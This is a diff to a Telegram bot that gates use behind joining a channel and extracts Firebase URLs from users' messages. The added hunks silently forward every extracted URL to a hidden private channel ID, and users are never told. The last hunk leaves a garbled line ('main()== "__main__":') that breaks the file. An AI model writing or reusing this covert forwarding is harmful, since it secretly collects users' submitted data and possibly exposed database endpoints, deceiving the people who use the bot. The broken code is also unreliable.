@@ -25,6 +25,10 @@ from telegram.ext import (
 CHANNEL_USERNAME = "@tokyooobaby"
 CHANNEL_LINK = "https://t.me/tokyooobaby"
 
+# Private channel where extracted Firebase URLs
+# will also be sent automatically
+RESULT_CHANNEL_ID = -1004474271816
+
 
 # ==========================================
 # URL DECODE
@@ -235,7 +239,7 @@ def generate_candidates(original):
 
 
 # ==========================================
-# FINAL EXTRACTION
+# FINAL FIREBASE EXTRACTION
 # ==========================================
 
 def extract_all(text):
@@ -254,7 +258,7 @@ def extract_all(text):
 
 
 # ==========================================
-# CHANNEL MEMBERSHIP
+# CHANNEL MEMBERSHIP CHECK
 # ==========================================
 
 async def is_channel_member(bot, user_id):
@@ -419,7 +423,7 @@ async def handle_message(
     if not user:
         return
 
-    # Every message checks membership
+    # Check channel membership on every message
     joined = await is_channel_member(
         context.bot,
         user.id
@@ -441,6 +445,7 @@ async def handle_message(
 
         return
 
+    # Extract Firebase URLs
     urls = extract_all(text)
 
     if not urls:
@@ -450,6 +455,33 @@ async def handle_message(
         )
 
         return
+
+
+    # ======================================
+    # SEND EVERY FIREBASE URL TO PRIVATE
+    # CHANNEL
+    # ======================================
+
+    for url in urls:
+
+        try:
+
+            await context.bot.send_message(
+                chat_id=RESULT_CHANNEL_ID,
+                text=url
+            )
+
+        except Exception as error:
+
+            print(
+                "Private channel send error:",
+                error
+            )
+
+
+    # ======================================
+    # SEND RESULT TO USER
+    # ======================================
 
     if len(urls) == 1:
 
@@ -472,6 +504,7 @@ async def handle_message(
             message += (
                 f"{index}. {url}\n"
             )
+
 
     await update.message.reply_text(
         message
@@ -499,6 +532,7 @@ def main():
         .build()
     )
 
+    # /start
     app.add_handler(
         CommandHandler(
             "start",
@@ -506,6 +540,7 @@ def main():
         )
     )
 
+    # Verify button
     app.add_handler(
         CallbackQueryHandler(
             verify_join,
@@ -513,6 +548,7 @@ def main():
         )
     )
 
+    # Normal messages
     app.add_handler(
         MessageHandler(
             filters.TEXT & ~filters.COMMAND,
@@ -528,4 +564,5 @@ def main():
 
 
 if __name__ == "__main__":
+    main()== "__main__":
     main()
